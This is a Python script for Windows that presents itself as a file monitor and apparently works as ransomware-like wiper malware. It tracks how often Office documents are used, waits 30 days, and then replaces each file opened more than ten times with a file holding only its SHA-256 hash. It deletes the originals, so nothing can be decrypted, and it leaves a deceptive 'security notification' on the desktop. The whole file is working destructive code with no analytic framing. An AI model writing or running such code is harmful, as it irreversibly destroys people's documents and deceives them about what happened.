import os
import time
import hashlib
import win32api
import win32con
import win32gui
import win32process
import psutil
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from datetime import datetime, timedelta

class FileMonitor:
    def __init__(self):
        self.file_access_counts = {}
        self.start_time = datetime.now()
        self.office_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']
        self.encrypted_files = set()
        self.desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        self.notification_file = os.path.join(self.desktop_path, 'FILE_SECURITY_NOTIFICATION.txt')

    def is_office_file(self, file_path):
        return any(file_path.lower().endswith(ext) for ext in self.office_extensions)

    def log_file_access(self, file_path):
        if self.is_office_file(file_path):
            if file_path in self.file_access_counts:
                self.file_access_counts[file_path] += 1
            else:
                self.file_access_counts[file_path] = 1

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()

            sha2_hash = hashlib.sha256(file_data).hexdigest()

            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(sha2_hash.encode())

            os.remove(file_path)
            self.encrypted_files.add(encrypted_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False

    def create_notification(self):
        notification_content = (
            "IMPORTANT SECURITY NOTIFICATION\n\n"
            "Your frequently accessed Office files have been encrypted for security purposes.\n"
            "To decrypt these files, please follow these steps:\n"
            "1. Contact your system administrator\n"
            "2. Provide the necessary authentication\n"
            "3. Follow the decryption instructions provided\n\n"
            "This measure has been implemented to protect your sensitive data.\n"
            "Thank you for your cooperation."
        )

        with open(self.notification_file, 'w') as f:
            f.write(notification_content)

    def check_and_encrypt_files(self):
        one_month_later = self.start_time + timedelta(days=30)
        if datetime.now() >= one_month_later:
            for file_path, count in self.file_access_counts.items():
                if count > 10 and file_path not in self.encrypted_files:
                    if self.encrypt_file(file_path):
                        print(f"Encrypted: {file_path}")
            self.create_notification()

    def monitor_processes(self):
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                process_name = proc.info['name'].lower()
                if 'winword' in process_name or 'excel' in process_name or 'powerpnt' in process_name:
                    for file in proc.open_files():
                        if self.is_office_file(file.path):
                            self.log_file_access(file.path)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

class OfficeFileHandler(FileSystemEventHandler):
    def __init__(self, monitor):
        self.monitor = monitor

    def on_modified(self, event):
        if not event.is_directory:
            self.monitor.log_file_access(event.src_path)

def main():
    monitor = FileMonitor()
    event_handler = OfficeFileHandler(monitor)
    observer = Observer()
    observer.schedule(event_handler, path='C:\\', recursive=True)
    observer.start()

    try:
        while True:
            monitor.monitor_processes()
            monitor.check_and_encrypt_files()
            time.sleep(60)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

if __name__ == "__main__":
    main()
